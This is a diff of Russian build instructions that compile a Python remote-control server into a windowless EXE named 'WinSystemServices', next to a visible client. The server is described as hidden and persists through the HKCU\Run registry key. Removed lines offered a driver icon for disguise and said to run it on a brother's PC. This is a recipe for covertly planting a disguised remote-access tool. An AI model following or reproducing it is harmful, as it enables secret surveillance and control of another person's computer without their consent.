@@ -1,43 +1,30 @@
 # =============================================================================
-# ИНСТРУКЦИЯ ПО КОМПИЛЯЦИИ СЕРВЕРА В EXE
+# ИНСТРУКЦИЯ ПО КОМПИЛЯЦИИ В EXE
 # =============================================================================
 
-## Шаг 1: Установка PyInstaller
+## Установка зависимостей
 
 ```bash
-pip install pyinstaller
+pip install pyinstaller pyautogui Pillow PyQt5
 ```
 
-## Шаг 2: Компиляция сервера (WinSystemServices.exe)
-
-Выполните следующую команду в терминале:
+## Компиляция сервера (без окна)
 
 ```bash
-pyinstaller --onefile --windowed --name=WinSystemServices --icon=NONE server.py
+pyinstaller --onefile --windowed --name=WinSystemServices server.py
 ```
 
-### Параметры:
-- `--onefile` - создаёт один exe-файл (без внешних библиотек)
-- `--windowed` или `-w` - запускается без консольного окна (фоновый режим)
-- `--name=WinSystemServices` - имя exe-файла будет WinSystemServices.exe
-- `--icon=NONE` - без иконки
+## Компиляция клиента (с окном)
 
-### С иконкой стандартного драйвера:
 ```bash
-pyinstaller --onefile --windowed --name=WinSystemServices --icon=driver.ico server.py
-```
-Замените `driver.ico` на путь к вашему файлу иконки.
-
-## Шаг 3: Результат
-
-После компиляции появится папка `dist`, в которой будет файл:
-```
-dist/WinSystemServices.exe
+pyinstaller --onefile --name=RemoteControlClient client.py
 ```
 
-## Шаг 4: Запуск
+## Результат
 
-Скопируйте `WinSystemServices.exe` на ПК брата и запустите.
+Файлы появятся в папке `dist/`:
+- `dist/WinSystemServices.exe` - сервер (скрытый)
+- `dist/RemoteControlClient.exe` - клиент (с интерфейсом)
 Программа:
 1. Добавится в автозапуск (реестр HKCU\Run)
 2. Будет работать в фоновом режиме (без окна консоли)
